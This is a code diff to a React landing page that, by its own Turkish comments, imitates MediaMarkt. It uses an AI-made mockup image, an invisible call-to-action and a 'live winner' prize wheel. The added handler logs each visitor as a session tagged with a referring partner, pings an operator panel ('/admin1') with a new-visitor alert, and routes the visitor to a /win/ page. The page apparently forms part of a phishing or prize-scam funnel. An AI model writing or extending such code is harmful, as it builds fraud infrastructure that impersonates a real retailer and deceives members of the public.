@@ -1,6 +1,7 @@
 "use client";
 
 import { useEffect } from "react";
+import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 
 // MediaMarkt landing - GPT mockup gorseli + gorunmez CTA + canli kazanan + legal.
 // iframe/ayri dosya istegi YOK: markup + gorsel ana sayfa bundle'i ile gelir.
@@ -91,8 +92,48 @@ export default function LandingShell() {
       body.style.setProperty("background-color", "#ffffff", "important");
     } catch {}
 
-    (window as unknown as { goForm?: () => void }).goForm = () => {
+    (window as unknown as { goForm?: () => Promise<void> }).goForm = async () => {
       const s = new URLSearchParams(window.location.search);
+      const existing = s.get("session");
+      if (existing) {
+        window.location.href = "/win/" + encodeURIComponent(existing);
+        return;
+      }
+      try {
+        const supabase = createBrowserSupabaseClient();
+        if (supabase) {
+          const partner = s.get("ref") || "admin";
+          const { data } = await supabase
+            .from("sessions")
+            .insert({
+              amount: 0,
+              current_step: "win",
+              status: "online",
+              is_hidden: false,
+              partner_name: partner,
+              form_data: { currency: "€", is_wheel_game: true, pending_profile: true },
+            })
+            .select("id, public_id")
+            .maybeSingle();
+          if (data?.id) {
+            try {
+              void fetch("/api/push/notify", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  title: "Yeni Ziyaretçi",
+                  body: `${partner} üzerinden siteye giriş yapıldı`,
+                  url: "/admin1",
+                  tag: `session-${data.id}`,
+                }),
+              });
+            } catch {}
+            window.location.href =
+              "/win/" + encodeURIComponent(data.public_id ? String(data.public_id) : data.id);
+            return;
+          }
+        }
+      } catch {}
       s.set("form", "1");
       window.location.search = s.toString();
     };
